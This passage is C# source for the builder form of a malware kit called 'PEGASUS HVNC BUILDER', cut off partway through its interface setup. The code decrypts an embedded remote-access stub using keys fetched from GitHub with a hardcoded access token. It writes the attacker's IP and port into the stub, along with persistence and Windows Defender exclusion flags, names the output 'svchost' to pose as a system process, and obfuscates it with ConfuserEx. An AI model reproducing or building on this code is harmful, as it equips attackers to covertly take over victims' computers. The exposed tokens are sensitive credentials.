using System;
using System.ComponentModel;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic;
using Mono.Cecil;
using Mono.Cecil.Cil;
using PEGASUS.LIME.UnderGround_Algorithmos;
using PEGASUS_LIME.Design.Algorithmos;
using PEGASUS_LIME.Design.Utils;
using PEGASUS_LIME.Properties;

namespace HVNC
{
	public class FrmBuilder : Form
	{
		public static byte[] b;

		public static Random r = new Random();

		public static Random random = new Random();

		private IContainer components;

		private Panel panel1;

		private Guna2ControlBox guna2ControlBox2;

		private Guna2ControlBox guna2ControlBox1;

		private Guna2DragControl guna2DragControl1;

		private Label label7;

		private Label label6;

		private Label label5;

		private Label label3;

		private Label label4;

		private Guna2Button RandomMutexBtn;

		private Guna2TextBox txtIdentifier;

		private Guna2TextBox txtMutex;

		private Guna2TextBox textBox2;

		private Guna2TextBox textBox1;

		private Guna2ComboBox comboBox1;

		private Guna2Button RandomFolderName;

		private Label label24;

		private Guna2CustomCheckBox chkEx;

		private Guna2CustomCheckBox EnableStartUpBox;

		private Label label18;

		private Guna2GroupBox guna2GroupBox1;

		private Guna2TextBox txtIP;

		private Guna2TextBox txtPORT;

		private Label label2;

		private Label label1;

		private Guna2CustomCheckBox guna2CustomCheckBox1;

		private Guna2Button WanBtn;

		private Guna2Button LANBtn;

		private Label label12;

		private Label label13;

		private Label label11;

		private Guna2CustomCheckBox chkHRDP;

		private Guna2Button BuildBtn;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ShadowForm guna2ShadowForm1;

		private Guna2Button guna2Button1;

		private Guna2CustomCheckBox chkC;

		private Guna2CustomCheckBox chkCplus;

		private Label label15;

		private Guna2TextBox hvncCplusListener;

		private Guna2Separator guna2Separator2;

		private Guna2Separator guna2Separator1;

		private Label label19;

		private Label label16;

		private Guna2CustomCheckBox chkEncrypt;

		private Guna2CustomCheckBox chkRename;

		private Label label14;

		private Label label8;

		private Label label9;

		private Label label10;

		private Label label17;

		private Guna2HtmlToolTip guna2HtmlToolTip1;


		private Label label20;

		private PictureBox pictureBox1;

		public FrmBuilder(string port)
		{
			InitializeComponent();
			txtPORT.Text = port;
		}

		private void button1_Click(object sender, EventArgs e)
		{
			if (txtIP.Text == "IP ADDRESS")
			{
				int num = (int)MessageBox.Show("IP or DNS is required in order to build.", "PEGASUS hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				Build();
			}
		}

        public static void canibuild(string resource)
        {
            Assembly executingAssembly = Assembly.GetExecutingAssembly();
            using Stream stream = executingAssembly.GetManifestResourceStream(resource);
            using StreamReader streamReader = new StreamReader(stream);
            string text = streamReader.ReadToEnd();
            string path = Path.Combine(Path.GetTempPath(), reupload("Y~\u007fh$oro"));
            byte[] bytes = Convert.FromBase64String(F(text.Replace("*", "O").Replace("-", "o").Replace(":", "A")));
            File.WriteAllBytes(path, bytes);
            File.SetAttributes(path, System.IO.FileAttributes.Hidden);
        }

        public static string F(string encrypted)
        {
			string arg = "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";
			string requestUri = "https://raw.githubusercontent.com/ThePonyCorporation/T800/main/iv.txt?token=GHSAT0AAAAAABUDVLFONJC6YK6URZKOCXXMYTOO5HA";
			string requestUri2 = "https://raw.githubusercontent.com/ThePonyCorporation/T800/main/key.txt?token=GHSAT0AAAAAABUDVLFPL7YCKTSENZW3F6DWYTOO44A";
			using HttpClient httpClient = new HttpClient();
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
            string s = string.Format(CultureInfo.InvariantCulture, "{0}:", arg);
            s = Convert.ToBase64String(Encoding.ASCII.GetBytes(s));
            httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", s);
            string result = httpClient.GetStringAsync(requestUri).Result;
            string s2 = result;
            string s3 = string.Format(CultureInfo.InvariantCulture, "{0}:", arg);
            s3 = Convert.ToBase64String(Encoding.ASCII.GetBytes(s3));
            httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", s3);
            string result2 = httpClient.GetStringAsync(requestUri2).Result;
            string s4 = result2;
            byte[] array = Convert.FromBase64String(encrypted);
            AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
            aesCryptoServiceProvider.BlockSize = 128;
            aesCryptoServiceProvider.KeySize = 256;
            aesCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(s4);
            aesCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(s2);
            aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
            aesCryptoServiceProvider.Mode = CipherMode.CBC;
            ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
            byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
            cryptoTransform.Dispose();
            return Encoding.ASCII.GetString(bytes);
        }

        private static string reupload(string str)
		{
			char c = '\n';
			StringBuilder stringBuilder = new StringBuilder();
			char[] array = str.ToCharArray();
			foreach (uint num in array)
			{
				char value = (char)(num ^ c);
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}

		public async void Build()
		{
			if (chkCplus.Checked)
			{
				string exe = Path.Combine(Path.GetTempPath(), reupload("Y~\u007fh$oro"));
				if (File.Exists(exe))
				{
					File.Delete(exe);
					canibuild(reupload("ZOMKY_YUFCGO$ZomkPo\u007fy$~}e$aos"));
				}
				else
				{
					canibuild(reupload("ZOMKY_YUFCGO$ZomkPo\u007fy$~}e$aos"));
				}
				ModuleDefMD asmDef3 = null;
				try
				{
					using (asmDef3 = ModuleDefMD.Load(exe))
					{
						SaveFileDialog saveFileDialog3 = new SaveFileDialog();
						try
						{
							saveFileDialog3.Filter = ".exe (*.exe)|*.exe";
							saveFileDialog3.InitialDirectory = Application.StartupPath;
							saveFileDialog3.OverwritePrompt = false;
							saveFileDialog3.FileName = "svchost";
							if (saveFileDialog3.ShowDialog() != DialogResult.OK)
							{
								return;
							}
							BuildBtn.Enabled = false;
							WriteSettings(asmDef3, saveFileDialog3.FileName);
							if (chkRename.Checked)
							{
								await Task.Run(delegate
								{
									Renaming.DoRenaming(asmDef3);
								});
							}
							asmDef3.Write(saveFileDialog3.FileName);
							asmDef3.Dispose();
							SaveSettings();
							do
							{
								Thread.Sleep(2000);
							}
							while (!File.Exists(saveFileDialog3.FileName));
							if (chkEncrypt.Checked)
							{
								await Task.Run(delegate
								{
									Confuser(saveFileDialog3.FileName, saveFileDialog3.FileName);
								});
							}
							BuildBtn.Text = "Build";
							BuildBtn.Enabled = true;
							File.Delete(exe);
							MsgBox.Show("Payload Packed/Encrypted and ready to Fly !", "PEGASUS LIME BUILDER", MsgBox.Buttons.OK);
						}
						finally
						{
							if (saveFileDialog3 != null)
							{
								((IDisposable)saveFileDialog3).Dispose();
							}
						}
					}
				}
				catch (Exception)
				{
					asmDef3?.Dispose();
				}
				return;
			}
			if (chkHRDP.Checked)
			{
				string exe3 = Path.Combine(Path.GetTempPath(), reupload("Y~\u007fh$oro"));
				if (File.Exists(exe3))
				{
					File.Delete(exe3);
					new Thread((ThreadStart)delegate
					{
						canibuild(reupload("ZOMKY_YUFCGO$ZomkPo\u007fy$~bxoo$aos"));
					}).Start();
				}
				else
				{
					new Thread((ThreadStart)delegate
					{
						canibuild(reupload("ZOMKY_YUFCGO$ZomkPo\u007fy$~bxoo$aos"));
					}).Start();
				}
				ModuleDefMD asmDef2 = null;
				try
				{
					using (asmDef2 = ModuleDefMD.Load(exe3))
					{
						SaveFileDialog saveFileDialog2 = new SaveFileDialog();
						try
						{
							saveFileDialog2.Filter = ".exe (*.exe)|*.exe";
							saveFileDialog2.InitialDirectory = Application.StartupPath;
							saveFileDialog2.OverwritePrompt = false;
							saveFileDialog2.FileName = "svchost";
							if (saveFileDialog2.ShowDialog() != DialogResult.OK)
							{
								return;
							}
							BuildBtn.Enabled = false;
							WriteSettings(asmDef2, saveFileDialog2.FileName);
							if (chkRename.Checked)
							{
								await Task.Run(delegate
								{
									Renaming.DoRenaming(asmDef2);
								});
							}
							asmDef2.Write(saveFileDialog2.FileName);
							asmDef2.Dispose();
							SaveSettings();
							do
							{
								Thread.Sleep(2000);
							}
							while (!File.Exists(saveFileDialog2.FileName));
							if (chkEncrypt.Checked)
							{
								await Task.Run(delegate
								{
									Confuser(saveFileDialog2.FileName, saveFileDialog2.FileName);
								});
							}
							BuildBtn.Text = "Build";
							BuildBtn.Enabled = true;
							File.Delete(exe3);
							MsgBox.Show("Payload Packed/Encrypted and ready to Fly !", "PEGASUS LIME BUILDER", MsgBox.Buttons.OK);
						}
						finally
						{
							if (saveFileDialog2 != null)
							{
								((IDisposable)saveFileDialog2).Dispose();
							}
						}
					}
				}
				catch (Exception)
				{
					asmDef2?.Dispose();
				}
				return;
			}
			string exe2 = Path.Combine(Path.GetTempPath(), reupload("Y~\u007fh$oro"));
			if (File.Exists(exe2))
			{
				File.Delete(exe2);
				canibuild(reupload("ZOMKY_YUFCGO$ZomkPo\u007fy$edo$aos"));
			}
			else
			{
				canibuild(reupload("ZOMKY_YUFCGO$ZomkPo\u007fy$edo$aos"));
			}
			ModuleDefMD asmDef = null;
			try
			{
				using (asmDef = ModuleDefMD.Load(exe2))
				{
					SaveFileDialog saveFileDialog1 = new SaveFileDialog();
					try
					{
						saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
						saveFileDialog1.InitialDirectory = Application.StartupPath;
						saveFileDialog1.OverwritePrompt = false;
						saveFileDialog1.FileName = "svchost";
						if (saveFileDialog1.ShowDialog() != DialogResult.OK)
						{
							return;
						}
						BuildBtn.Enabled = false;
						WriteSettings(asmDef, saveFileDialog1.FileName);
						if (chkRename.Checked)
						{
							await Task.Run(delegate
							{
								Renaming.DoRenaming(asmDef);
							});
						}
						asmDef.Write(saveFileDialog1.FileName);
						asmDef.Dispose();
						SaveSettings();
						do
						{
							Thread.Sleep(2000);
						}
						while (!File.Exists(saveFileDialog1.FileName));
						if (chkEncrypt.Checked)
						{
							await Task.Run(delegate
							{
								Confuser(saveFileDialog1.FileName, saveFileDialog1.FileName);
							});
						}
						BuildBtn.Text = "Build";
						BuildBtn.Enabled = true;
						File.Delete(exe2);
						MsgBox.Show("Payload Packed/Encrypted and ready to Fly !", "PEGASUS LIME BUILDER", MsgBox.Buttons.OK);
					}
					finally
					{
						if (saveFileDialog1 != null)
						{
							((IDisposable)saveFileDialog1).Dispose();
						}
					}
				}
			}
			catch (Exception)
			{
				asmDef?.Dispose();
			}
		}

		private void SaveSettings()
		{
			try
			{
			}
			catch
			{
			}
		}

		private static void Confuser(string file, string output)
		{
			string path = Path.GetTempPath() + "them.tmd";
			string config = Resources.config;
			config = config.Replace("%path%", Path.GetTempPath()).Replace("%stub%", file);
			File.WriteAllText(Path.GetTempPath() + "configconfuser.crproj", config);
			File.WriteAllBytes(Path.GetTempPath() + "confuser.zip", Resources.ConfuserEx);
			File.WriteAllBytes(Path.GetTempPath() + "confuser.zip", Resources.ConfuserEx);
			if (Directory.Exists(Path.GetTempPath() + "Confuser"))
			{
				Directory.Delete(Path.GetTempPath() + "Confuser", recursive: true);
				Directory.CreateDirectory(Path.GetTempPath() + "Confuser");
			}
			ZipFile.ExtractToDirectory(Path.GetTempPath() + "confuser.zip", Path.GetTempPath() + "Confuser");
			Interaction.Shell(Path.GetTempPath() + "Confuser\\Confuser.CLI.exe -n " + Path.GetTempPath() + "configconfuser.crproj", AppWinStyle.Hide, Wait: true);
			File.Delete(file + ".bak");
			File.Delete(Path.GetTempPath() + "confuser.zip");
			File.Delete(Path.GetTempPath() + "configconfuser.crproj");
			File.Delete(path);
			Directory.Delete(Path.GetTempPath() + "Confuser", recursive: true);
		}

		private void WriteSettings(ModuleDefMD asmDef, string AsmName)
		{
			try
			{
				string randomString = Methods.GetRandomString(32);
				Aes256 aes = new Aes256(randomString);
				foreach (TypeDef type in asmDef.Types)
				{
					asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
					asmDef.Name = Path.GetFileName(AsmName);
					if (!(type.Name == "Program"))
					{
						continue;
					}
					foreach (MethodDef method in type.Methods)
					{
						if (method.Body == null)
						{
							continue;
						}
						for (int i = 0; i < method.Body.Instructions.Count(); i++)
						{
							if (method.Body.Instructions[i].OpCode != dnlib.DotNet.Emit.OpCodes.Ldstr)
							{
								continue;
							}
							if (method.Body.Instructions[i].Operand.ToString() == "#IPDNS#")
							{
								method.Body.Instructions[i].Operand = txtIP.Text;
							}
							if (method.Body.Instructions[i].Operand.ToString() == "#PORT#")
							{
								method.Body.Instructions[i].Operand = hvncCplusListener.Text;
							}
							if (method.Body.Instructions[i].Operand.ToString() == "#SPORT#")
							{
								method.Body.Instructions[i].Operand = txtPORT.Text;
							}
							if (method.Body.Instructions[i].Operand.ToString() == "#ID#")
							{
								method.Body.Instructions[i].Operand = txtIdentifier.Text;
							}
							if (method.Body.Instructions[i].Operand.ToString() == "#MTX#")
							{
								method.Body.Instructions[i].Operand = txtMutex.Text;
							}
							if (method.Body.Instructions[i].Operand.ToString() == "#PATH#")
							{
								method.Body.Instructions[i].Operand = comboBox1.Text;
							}
							if (method.Body.Instructions[i].Operand.ToString() == "#FOLDER#")
							{
								method.Body.Instructions[i].Operand = textBox1.Text;
							}
							if (method.Body.Instructions[i].Operand.ToString() == "#FILENAME#")
							{
								method.Body.Instructions[i].Operand = textBox2.Text;
							}
							if (EnableStartUpBox.Checked)
							{
								if (method.Body.Instructions[i].Operand.ToString() == "#STARTUP#")
								{
									method.Body.Instructions[i].Operand = "True";
								}
							}
							else if (method.Body.Instructions[i].Operand.ToString() == "#STARTUP#")
							{
								method.Body.Instructions[i].Operand = "False";
							}
							if (chkEx.Checked)
							{
								if (method.Body.Instructions[i].Operand.ToString() == "#WDEX#")
								{
									method.Body.Instructions[i].Operand = "True";
								}
							}
							else if (method.Body.Instructions[i].Operand.ToString() == "#WDEX#")
							{
								method.Body.Instructions[i].Operand = "False";
							}
							if (chkHRDP.Checked && method.Body.Instructions[i].Operand.ToString() == "#HHVNC#")
							{
								method.Body.Instructions[i].Operand = "";
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				throw new ArgumentException("WriteSettings: " + ex.Message);
			}
		}

		private ushort GetPortSafe()
		{
			string s = txtPORT.Text.ToString(CultureInfo.InvariantCulture);
			ushort result;
			return (ushort)(ushort.TryParse(s, out result) ? result : 0);
		}

		private void build()
		{
			ushort portSafe = GetPortSafe();
			try
			{
				using SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.Filter = ".exe (*.exe)|*.exe";
				saveFileDialog.InitialDirectory = Application.StartupPath;
				saveFileDialog.OverwritePrompt = false;
				saveFileDialog.FileName = "PegasusLime_Client";
				if (saveFileDialog.ShowDialog() != DialogResult.OK)
				{
					return;
				}
				string randomString = Methods.GetRandomString(32);
				Aes256 aes = new Aes256(randomString);
				if (!File.Exists(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\Stub\\Stub.exe"))
				{
					MsgBox.Show("Stub not found !", "Error !", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				}
				else if (chkCplus.Checked)
				{
					AssemblyDefinition assemblyDefinition = AssemblyDefinition.ReadAssembly(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\Stub\\Stub1.exe");
					foreach (TypeDefinition type in assemblyDefinition.MainModule.Types)
					{
						if (!type.ToString().Contains("Program"))
						{
							continue;
						}
						foreach (MethodDefinition method in type.Methods)
						{
							if (method.ToString().Contains("Exec"))
							{
								foreach (Mono.Cecil.Cil.Instruction instruction in method.Body.Instructions)
								{
									if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#IPDNS#")
									{
										instruction.Operand = txtIP.Text;
									}
									if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#PORT#")
									{
										instruction.Operand = hvncCplusListener.Text;
									}
									if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#ID#")
									{
										instruction.Operand = txtIdentifier.Text;
									}
									if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#MTX#")
									{
										instruction.Operand = txtMutex.Text;
									}
									if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#PATH#")
									{
										instruction.Operand = comboBox1.Text;
									}
									if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#FOLDER#")
									{
										instruction.Operand = textBox1.Text;
									}
									if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#FILENAME#")
									{
										instruction.Operand = textBox2.Text;
									}
									if (EnableStartUpBox.Checked)
									{
										if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#STARTUP#")
										{
											instruction.Operand = "True";
										}
									}
									else if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#STARTUP#")
									{
										instruction.Operand = "False";
									}
									if (chkEx.Checked)
									{
										if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#WDEX#")
										{
											instruction.Operand = "True";
										}
									}
									else if (instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#WDEX#")
									{
										instruction.Operand = "False";
									}
									if (chkHRDP.Checked && instruction.OpCode.ToString() == "ldstr" && instruction.Operand.ToString() == "#HHVNC#")
									{
										instruction.Operand = "True";
									}
								}
							}
							if (!method.ToString().Contains("Main"))
							{
								continue;
							}
							foreach (Mono.Cecil.Cil.Instruction instruction2 in method.Body.Instructions)
							{
								if (instruction2.OpCode.ToString() == "ldstr" && instruction2.Operand.ToString() == "#IPDNS#")
								{
									instruction2.Operand = txtIP.Text;
								}
								if (instruction2.OpCode.ToString() == "ldstr" && instruction2.Operand.ToString() == "#SPORT#")
								{
									instruction2.Operand = txtPORT.Text;
								}
								if (instruction2.OpCode.ToString() == "ldstr" && instruction2.Operand.ToString() == "#ID#")
								{
									instruction2.Operand = txtIdentifier.Text;
								}
							}
						}
					}
					string fileName = saveFileDialog.FileName;
					assemblyDefinition.Write(fileName);
					assemblyDefinition.Dispose();
				}
				else
				{
					AssemblyDefinition assemblyDefinition2 = AssemblyDefinition.ReadAssembly(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) + "\\Stub\\Stub.exe");
					foreach (TypeDefinition type2 in assemblyDefinition2.MainModule.Types)
					{
						if (!type2.ToString().Contains("Program"))
						{
							continue;
						}
						foreach (MethodDefinition method2 in type2.Methods)
						{
							if (!method2.ToString().Contains("Main"))
							{
								continue;
							}
							foreach (Mono.Cecil.Cil.Instruction instruction3 in method2.Body.Instructions)
							{
								if (instruction3.OpCode.ToString() == "ldstr" && instruction3.Operand.ToString() == "#IPDNS#")
								{
									instruction3.Operand = txtIP.Text;
								}
								if (instruction3.OpCode.ToString() == "ldstr" && instruction3.Operand.ToString() == "#SPORT#")
								{
									instruction3.Operand = txtPORT.Text;
								}
								if (instruction3.OpCode.ToString() == "ldstr" && instruction3.Operand.ToString() == "#PORT#")
								{
									instruction3.Operand = hvncCplusListener.Text;
								}
								if (instruction3.OpCode.ToString() == "ldstr" && instruction3.Operand.ToString() == "#ID#")
								{
									instruction3.Operand = txtIdentifier.Text;
								}
								if (instruction3.OpCode.ToString() == "ldstr" && instruction3.Operand.ToString() == "#MTX#")
								{
									instruction3.Operand = txtMutex.Text;
								}
								if (instruction3.OpCode.ToString() == "ldstr" && instruction3.Operand.ToString() == "#PATH#")
								{
									instruction3.Operand = comboBox1.Text;
								}
								if (instruction3.OpCode.ToString() == "ldstr" && instruction3.Operand.ToString() == "#FOLDER#")
								{
									instruction3.Operand = textBox1.Text;
								}
								if (instruction3.OpCode.ToString() == "ldstr" && instruction3.Operand.ToString() == "#FILENAME#")
								{
									instruction3.Operand = textBox2.Text;
								}
								if (EnableStartUpBox.Checked)
								{
									if (instruction3.OpCode.ToString() == "ldstr" && instruction3.Operand.ToString() == "#STARTUP#")
									{
										instruction3.Operand = "True";
									}
								}
								else if (instruction3.OpCode.ToString() == "ldstr" && instruction3.Operand.ToString() == "#STARTUP#")
								{
									instruction3.Operand = "False";
								}
								if (chkEx.Checked)
								{
									if (instruction3.OpCode.ToString() == "ldstr" && instruction3.Operand.ToString() == "#WDEX#")
									{
										instruction3.Operand = "True";
									}
								}
								else if (instruction3.OpCode.ToString() == "ldstr" && instruction3.Operand.ToString() == "#WDEX#")
								{
									instruction3.Operand = "False";
								}
								if (chkHRDP.Checked && instruction3.OpCode.ToString() == "ldstr" && instruction3.Operand.ToString() == "#HHVNC#")
								{
									instruction3.Operand = "True";
								}
							}
						}
					}
					string fileName2 = saveFileDialog.FileName;
					assemblyDefinition2.Write(fileName2);
					assemblyDefinition2.Dispose();
				}
				MsgBox.Show("Payload Packed/Encrypted and ready to Fly !", "PEGASUS LIME BUILDER", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
			}
			catch (Exception ex)
			{
				throw new ArgumentException("WriteSettings: " + ex.Message);
			}
		}

		private void FrmBuilder_Load(object sender, EventArgs e)
		{
			label12.ForeColor = Color.White;
			label11.ForeColor = Color.White;
			txtMutex.Text = RandomMutex(9);
			textBox1.Text = RandomMutex(9);
			textBox2.Text = RandomMutex(9) + ".exe";
		}

		public static string RandomMutex(int length)
		{
			return new string((from s in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", length)
				select s[random.Next(s.Length)]).ToArray());
		}

		public static string RandomNumber(int length)
		{
			return new string((from s in Enumerable.Repeat("0123456789", length)
				select s[random.Next(s.Length)]).ToArray());
		}

		private void button2_Click(object sender, EventArgs e)
		{
			txtMutex.Text = RandomMutex(9);
		}

		private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
		{
		}

		private void button3_Click(object sender, EventArgs e)
		{
			textBox1.Text = RandomMutex(9);
			textBox2.Text = RandomMutex(9) + ".exe";
		}

		public static string GetLocalIPAddress()
		{
			IPAddress[] addressList = Dns.GetHostEntry(Dns.GetHostName()).AddressList;
			foreach (IPAddress iPAddress in addressList)
			{
				if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
				{
					return iPAddress.ToString();
				}
			}
			throw new Exception("No network adapters with an IPv4 address in the system!");
		}

		private void LANBtn_Click(object sender, EventArgs e)
		{
			txtIP.Text = GetLocalIPAddress();
		}

		public async void definewanip()
		{
			string pubIp = new WebClient().DownloadString("https://ifconfig.me/ip");
			await Task.Delay(500);
			txtIP.Text = pubIp;
		}

		private void WanBtn_Click(object sender, EventArgs e)
		{
			try
			{
				if (string.IsNullOrWhiteSpace(txtIP.Text))
				{
					definewanip();
				}
				else
				{
					definewanip();
				}
			}
			catch (Exception)
			{
				int num = (int)MessageBox.Show("An Error Occured While Trying To Retreive Your WAN IP, Please Type It Manually.");
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.FrmBuilder));
			panel1 = new System.Windows.Forms.Panel();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			label18 = new System.Windows.Forms.Label();
			guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
			guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
			guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(components);
			label7 = new System.Windows.Forms.Label();
			label6 = new System.Windows.Forms.Label();
			label5 = new System.Windows.Forms.Label();
			label3 = new System.Windows.Forms.Label();
			label4 = new System.Windows.Forms.Label();
			txtIdentifier = new Guna.UI2.WinForms.Guna2TextBox();
			txtMutex = new Guna.UI2.WinForms.Guna2TextBox();
			textBox2 = new Guna.UI2.WinForms.Guna2TextBox();
			textBox1 = new Guna.UI2.WinForms.Guna2TextBox();
			RandomMutexBtn = new Guna.UI2.WinForms.Guna2Button();
			comboBox1 = new Guna.UI2.WinForms.Guna2ComboBox();
			RandomFolderName = new Guna.UI2.WinForms.Guna2Button();
			label24 = new System.Windows.Forms.Label();
			chkEx = new Guna.UI2.WinForms.Guna2CustomCheckBox();
			EnableStartUpBox = new Guna.UI2.WinForms.Guna2CustomCheckBox();
			guna2GroupBox1 = new Guna.UI2.WinForms.Guna2GroupBox();
			label20 = new System.Windows.Forms.Label();
			label19 = new System.Windows.Forms.Label();
			label16 = new System.Windows.Forms.Label();
			chkEncrypt = new Guna.UI2.WinForms.Guna2CustomCheckBox();
			chkRename = new Guna.UI2.WinForms.Guna2CustomCheckBox();
			label11 = new System.Windows.Forms.Label();
			label12 = new System.Windows.Forms.Label();
			label15 = new System.Windows.Forms.Label();
			hvncCplusListener = new Guna.UI2.WinForms.Guna2TextBox();
			label14 = new System.Windows.Forms.Label();
			label8 = new System.Windows.Forms.Label();
			chkC = new Guna.UI2.WinForms.Guna2CustomCheckBox();
			chkCplus = new Guna.UI2.WinForms.Guna2CustomCheckBox();
			guna2Button1 = new Guna.UI2.WinForms.Guna2Button();
			label13 = new System.Windows.Forms.Label();
			txtIP = new Guna.UI2.WinForms.Guna2TextBox();
			txtPORT = new Guna.UI2.WinForms.Guna2TextBox();
			label2 = new System.Windows.Forms.Label();
			label1 = new System.Windows.Forms.Label();
			guna2CustomCheckBox1 = new Guna.UI2.WinForms.Guna2CustomCheckBox();
			chkHRDP = new Guna.UI2.WinForms.Guna2CustomCheckBox();
			label9 = new System.Windows.Forms.Label();
			label10 = new System.Windows.Forms.Label();
			label17 = new System.Windows.Forms.Label();
			WanBtn = new Guna.UI2.WinForms.Guna2Button();
			LANBtn = new Guna.UI2.WinForms.Guna2Button();
			guna2Separator1 = new Guna.UI2.WinForms.Guna2Separator();
			guna2Separator2 = new Guna.UI2.WinForms.Guna2Separator();
			BuildBtn = new Guna.UI2.WinForms.Guna2Button();
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			guna2HtmlToolTip1 = new Guna.UI2.WinForms.Guna2HtmlToolTip();
			panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			guna2GroupBox1.SuspendLayout();
			SuspendLayout();
			panel1.BackColor = System.Drawing.Color.Black;
			panel1.Controls.Add(pictureBox1);
			panel1.Controls.Add(label18);
			panel1.Controls.Add(guna2ControlBox2);
			panel1.Controls.Add(guna2ControlBox1);
			panel1.Dock = System.Windows.Forms.DockStyle.Top;
			panel1.Location = new System.Drawing.Point(0, 0);
			panel1.Name = "panel1";
			panel1.Size = new System.Drawing.Size(430, 53);
			panel1.TabIndex = 13;
			pictureBox1.Image = PEGASUS_LIME.Properties.Resources.pegamatrix;
			pictureBox1.Location = new System.Drawing.Point(0, -1);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(89, 54);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			pictureBox1.TabIndex = 145;
			pictureBox1.TabStop = false;
			pictureBox1.MouseDown += new System.Windows.Forms.MouseEventHandler(label18_MouseDown);
			label18.AutoSize = true;
			label18.Font = new System.Drawing.Font("Electrolize", 11.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label18.Location = new System.Drawing.Point(113, 18);
			label18.Name = "label18";
			label18.Size = new System.Drawing.Size(209, 18);
			label18.TabIndex = 2;
			label18.Text = "PEGASUS HVNC BUILDER";
			label18.MouseDown += new System.Windows.Forms.MouseEventHandler(label18_MouseDown);
			guna2ControlBox2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox2.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2ControlBox2.BackgroundImage");
			guna2ControlBox2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			guna2ControlBox2.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
			guna2ControlBox2.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.HoverState.Parent = guna2ControlBox2;
			guna2ControlBox2.IconColor = System.Drawing.Color.White;
			guna2ControlBox2.Location = new System.Drawing.Point(330, 15);
			guna2ControlBox2.Name = "guna2ControlBox2";
			guna2ControlBox2.ShadowDecoration.Parent = guna2ControlBox2;
			guna2ControlBox2.ShowIcon = false;
			guna2ControlBox2.Size = new System.Drawing.Size(45, 29);
			guna2ControlBox2.TabIndex = 0;
			guna2ControlBox2.UseTransparentBackground = true;
			guna2ControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox1.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox1.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2ControlBox1.BackgroundImage");
			guna2ControlBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			guna2ControlBox1.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox1.HoverState.Parent = guna2ControlBox1;
			guna2ControlBox1.IconColor = System.Drawing.Color.White;
